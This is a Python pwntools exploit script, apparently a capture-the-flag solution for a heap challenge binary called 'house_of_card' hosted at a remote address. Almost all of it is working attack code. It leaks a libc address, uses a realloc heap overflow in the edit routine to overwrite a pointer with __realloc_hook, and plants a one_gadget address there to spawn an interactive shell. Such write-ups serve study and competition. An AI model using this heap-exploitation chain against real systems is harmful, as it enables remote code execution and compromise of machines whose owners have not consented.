from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./house_of_card"
bin = ELF(file)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./libc.so")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so")}

#conn = gdb.debug(file, env=env)
conn = remote("178.128.87.12", 31336)

def menu(ch):
    conn.recvuntil("Quit\n")
    conn.sendline(str(ch))

"""
read(name, 63 char)
read(len)
malloc(len) and read desc in it
malloc(len + 69) and set structure
free(desc)
malloc(0x18) for node
insert at end of list
"""
def new(name, l, desc):
    menu(1)
    conn.recvuntil("Name")
    conn.send(name)
    conn.recvuntil("Len")
    conn.sendline(str(l))
    conn.recvuntil("Description")
    conn.send(desc)

"""
read(idx)
read(name, 64 char)
read(len)
if len <= original_len:
  read(desc, len char)
else
  realloc(original_note, len + 68)
  read(desc, len + 68 char) -- overflow
"""
def edit(idx, name, l, desc, menu_call=True):
    if menu_call:
        menu(2)
    conn.recvuntil("Back.")
    conn.sendline(str(idx))
    conn.recvuntil("New name")
    conn.send(name)
    conn.recvuntil("Len?")
    conn.sendline(str(l))
    conn.send(desc)

"""
read(idx)
free(note)
free(node)
"""
def delete(idx):
    menu(3)
    conn.recvuntil("Back.")
    conn.sendline(str(idx))
    conn.recvuntil("Done")

# Libc leak
new("vampire\n", 0x100, "desc1\n")
new("vampire2\n", 0x100, "desc2\n")
new("vampire3\n", 0x100, "desc3\n")
menu(2)
conn.recvuntil("desc3\x00\x00\x00")
libc_leak = u64(conn.recvn(8))
#libc.address = libc_leak - 0x7f0ba43d4c78 + 0x7f0ba4010000
libc.address = libc_leak - 0x7efd6c656c58 + 0x7efd6c295000

edit(1, "vampire\n", 0x100, "desc1\n", menu_call=False)

log.info("Libc base : " + hex(libc.address))

# Clearing up heap
delete(1)
delete(1)
delete(1)
new("vampire\n", 0x400, "desc1\n")
delete(1) # consolidate

# Only the first chunk in fastbin, can be ignored since it'll
# pop out the next  malloc

# Overwriting node_ptr
new("vampire\n", 0x100, "desc1\n")
# Clear up the unsorted bin
for i in range(8):
    new("vampire%d\n" % i, 0x110, "desc2\n")
new("vampire10\n", 0x100, "desc10\n")
#delete(10)
payload = "d"*(0xd0 + 60)  + p64(libc.symbols['__realloc_hook']) + "\n"
edit(1, "vampire\n", 0x101, payload)
one_gadget = libc.address + 0xce0e1
edit(10, p64(one_gadget) + "\n", 0x100, "ls -l\n")
conn.interactive()
